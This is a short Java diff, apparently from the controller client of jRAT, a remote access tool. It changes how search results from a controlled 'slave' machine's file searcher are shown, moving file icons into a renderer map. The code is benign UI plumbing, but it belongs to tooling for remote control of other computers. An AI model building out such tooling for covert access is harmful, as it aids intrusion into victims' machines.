@@ -7,6 +7,7 @@ import io.jrat.client.utils.IconUtils;
 
 import java.io.DataInputStream;
 
+import javax.swing.ImageIcon;
 
 public class Packet37SearchResult extends AbstractIncomingPacket {
 
@@ -19,7 +20,8 @@ public class Packet37SearchResult extends AbstractIncomingPacket {
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
 		if (frame != null) {
 			PanelControlSearch panel = (PanelControlSearch) frame.panels.get("file searcher");
-			panel.getModel().addRow(new Object[] { IconUtils.getFileIconFromExtension(name, dir), path, name });
+			panel.getRenderer().icons.put(path, (ImageIcon) IconUtils.getFileIconFromExtension(name, dir));
+			panel.getModel().addRow(new Object[] { path, name });
 		}
 	}
 
